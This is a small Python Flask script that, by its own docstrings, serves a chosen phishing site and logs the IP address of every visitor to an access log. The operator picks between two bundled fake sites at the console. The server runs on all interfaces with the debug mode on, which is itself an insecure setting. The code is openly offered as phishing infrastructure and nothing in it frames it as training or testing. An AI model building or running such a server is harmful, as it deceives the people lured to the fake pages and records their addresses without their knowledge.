from flask import Flask, send_from_directory, request
import logging
import os

app = Flask(__name__)

# Set up logging
if not os.path.exists('log'):
    os.makedirs('log')
logging.basicConfig(filename='log/access.log', level=logging.INFO, format='%(asctime)s - IP: %(message)s')

@app.route('/')
def index():
    """Serve the phishing site based on user's choice."""
    print("Choose a phishing site to serve:")
    print("1. Site 1")
    print("2. Site 2")
    
    choice = input("Enter choice (1/2): ")
    
    if choice == '1':
        site = "site1"
    elif choice == '2':
        site = "site2"
    else:
        print("Invalid choice!")
        return "Invalid choice! Restart the tool and choose 1 or 2."
    
    return send_from_directory(f'sites/{site}', 'index.html')

@app.route('/<path:path>')
def log_ip(path):
    """Log the IP address and serve the requested file."""
    user_ip = request.remote_addr
    logging.info(user_ip)
    return send_from_directory('sites', path)

if __name__ == "__main__":
    try:
        app.run(debug=True, host='0.0.0.0')
    except Exception as e:
        print(f"An error occurred: {e}")
